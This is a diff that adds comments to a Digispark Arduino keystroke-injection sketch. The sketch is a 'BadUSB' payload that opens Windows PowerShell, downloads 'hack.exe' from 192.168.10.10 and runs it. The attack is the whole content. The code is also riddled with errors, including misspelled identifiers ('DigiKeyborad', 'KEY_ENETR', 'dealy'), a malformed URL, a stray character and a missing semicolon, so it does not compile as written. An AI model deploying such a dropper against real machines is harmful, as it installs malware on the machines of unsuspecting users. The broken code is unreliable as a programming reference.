@@ -1,28 +1,28 @@
-#define kbd_tr_tr
-#include "DigiKeyboard.h"
+#define kbd_tr_tr //include keyboard
+#include "DigiKeyboard.h"  //include module
 
 
 void setup() {
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000); //Used to determine the waiting time.
+  DigiKeyboard.sendKeyStroke(0); //Used for keystroke execution
 }
 
 void loop() {
-  DigiKeyboard.SendKeyStroke(KEY_D, MOD_GUİ_LEFT); 
+  DigiKeyboard.SendKeyStroke(KEY_D, MOD_GUİ_LEFT);  //open windows desktops
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(0);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.SendKeyStroke(KEY_R, MOD_GUİ_LEFT);
+  DigiKeyboard.SendKeyStroke(KEY_R, MOD_GUİ_LEFT); //open opens the windows run tool
   DigiKeyboard.delay(1000);
-  DigiKeyborad.print("powershell");
+  DigiKeyborad.print("powershell"); // used to open windows powershell
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke("$webClient = New-Object System.Net.WebClient");
+  DigiKeyboard.sendKeyStroke("$webClient = New-Object System.Net:WebClient"); //file creation command
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENETR);
   DigiKeyboard.delay(1000);r
-  DigiKeyboard.print(" $webClient.DownloadFile.('http:192.168.10.10/hack.exe','hack.exe')");
+  DigiKeyboard.print(" $webClient.DownloadFile.('http:192.168.10.10/hack.exe','hack.exe')"); //Used to download the file from the target IP address
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENTER);
   DigiKeyboard.dealy(8000);
@@ -33,10 +33,10 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(8000);
-  DigiKeyboard.SendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.SendKeyStroke(KEY_R, MOD_GUI_LEFT);//open opens the windows run tool
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("hack.exe")
-    DigiKeyboard.delay(1000);
+  DigiKeyboard.print("hack.exe") // used to run exe
+  DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.SendKeyStroke(KEY_ENTER);
